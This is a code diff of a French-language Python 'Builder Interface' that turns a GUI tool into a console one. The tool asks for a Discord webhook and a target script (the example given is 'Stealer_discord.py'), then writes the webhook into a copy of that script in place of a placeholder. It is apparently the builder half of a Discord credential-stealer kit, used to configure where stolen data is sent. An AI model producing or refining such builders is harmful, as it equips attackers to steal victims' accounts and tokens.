@@ -1,64 +1,46 @@
 import sys
 import os
-from PyQt5.QtWidgets import *
 
-class MainWindow(QMainWindow):
+def main():
+    print("=== BUILDER INTERFACE - CONSOLE VERSION ===")
+    print()
 
-    def __init__(self):
-        super().__init__()
+    # Entrer le webhook Discord
+    webhook = input("Entrer webhook Discord: ").strip()
 
-        self.setWindowTitle("Builder Interface")
-        self.resize(500, 300)
+    if not webhook:
+        print("Erreur: Webhook manquant")
+        return
 
-        layout = QVBoxLayout()
+    # Demander le fichier à modifier
+    script_path = input("Chemin du script Python à modifier (ex: Stealer_discord.py): ").strip()
 
-        self.webhook_input = QLineEdit()
-        self.webhook_input.setPlaceholderText("Entrer webhook Discord")
+    if not os.path.exists(script_path):
+        print(f"Erreur: Fichier '{script_path}' introuvable")
+        return
 
-        self.build_btn = QPushButton("Build script")
-
-        self.log = QTextEdit()
-        self.log.setReadOnly(True)
-
-        layout.addWidget(QLabel("Webhook Discord"))
-        layout.addWidget(self.webhook_input)
-        layout.addWidget(self.build_btn)
-        layout.addWidget(self.log)
-
-        container = QWidget()
-        container.setLayout(layout)
-        self.setCentralWidget(container)
-
-        self.build_btn.clicked.connect(self.build_script)
-
-    def build_script(self):
-
-        webhook = self.webhook_input.text().strip()
-
-        if not webhook:
-            self.log.append("Webhook manquant")
-            return
-
-        file_path, _ = QFileDialog.getOpenFileName(self, "Choisir script", "", "Python Files (*.py)")
-        if not file_path:
-            return
-
-        with open(file_path, "r", encoding="utf-8") as f:
+    try:
+        # Lire le fichier
+        with open(script_path, "r", encoding="utf-8") as f:
             code = f.read()
 
-        code = code.replace("WEBHOOK_URL_PLACEHOLDER", webhook)
+        # Remplacer le placeholder
+        if "WEBHOOK_URL_PLACEHOLDER" in code:
+            code = code.replace("WEBHOOK_URL_PLACEHOLDER", webhook)
 
-        script_dir = os.path.dirname(os.path.abspath(__file__))
-        output = os.path.join(script_dir, "built_script.py")
+            # Sauvegarder le fichier modifié
+            output_path = script_path.replace(".py", "_built.py")
+            with open(output_path, "w", encoding="utf-8") as f:
+                f.write(code)
 
-        with open(output, "w", encoding="utf-8") as f:
-            f.write(code)
+            print(f"✓ Script construit avec succès: {output_path}")
+            print(f"✓ Webhook intégré: {webhook}")
+        else:
+            print("Erreur: Placeholder 'WEBHOOK_URL_PLACEHOLDER' non trouvé dans le fichier")
 
-        self.log.append("Script buildé avec webhook")
-
+    except Exception as e:
+        print(f"Erreur lors du traitement: {e}")
 
 if __name__ == "__main__":
-    app = QApplication(sys.argv)
-    window = MainWindow()
-    window.show()
-    sys.exit(app.exec_())
+    main()
+    input("\nAppuyez sur Entrée pour quitter...")
